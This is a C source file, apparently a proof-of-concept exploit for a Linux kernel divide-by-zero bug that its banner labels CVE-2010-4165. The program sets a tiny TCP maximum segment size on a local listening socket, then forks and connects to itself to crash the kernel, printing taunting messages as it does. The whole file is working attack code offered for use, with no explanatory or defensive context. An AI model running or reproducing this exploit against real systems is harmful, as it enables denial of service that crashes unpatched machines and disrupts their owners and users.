#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
 
 
int main() {
    int optval, optlen, ret, sd, sd2, pid;
    char *host = "localhost";  
    struct sockaddr_in locAddr;
    struct sockaddr_in servAddr;
    struct sockaddr_in dstAddr;
    printf("[ Linux Kernel tcp_select_initial_window divide by 0 DoS\n");  
    sd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&servAddr,0,sizeof(servAddr));
    memset(&dstAddr,0,sizeof(dstAddr));
        servAddr.sin_family = AF_INET;
        servAddr.sin_port = htons(60000);
        servAddr.sin_addr.s_addr = INADDR_ANY;
    dstAddr.sin_family = AF_INET;
    inet_aton("127.0.0.1", &dstAddr.sin_addr);
    dstAddr.sin_port = htons(60000);
        if((bind(sd,(struct sockaddr *)&servAddr,sizeof(struct sockaddr))) == -1){
                printf("[ Cannot bind listener service\n");
                exit(-1);
        }
    listen(sd,4);
    optval = 12;
    ret = setsockopt(sd, IPPROTO_TCP, TCP_MAXSEG, &optval, sizeof(optval));
    if(ret==0)
    {
        printf("[ System is not patched against CVE-2010-4165\n[ Goodnight, sweet prince.\n");
        int sin_size = sizeof(struct sockaddr_in);
        switch(pid = fork())
        {
            case 0:
                sd = accept(sd,(struct sockaddr *)&locAddr,&sin_size);
                sleep(3);
            default:
                sd2 = socket(AF_INET, SOCK_STREAM, 0);
                connect(sd2, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
                sleep(3);
        }
    }
    printf("[ System is patched, no dreams for this prince\n");
    return 0;
}

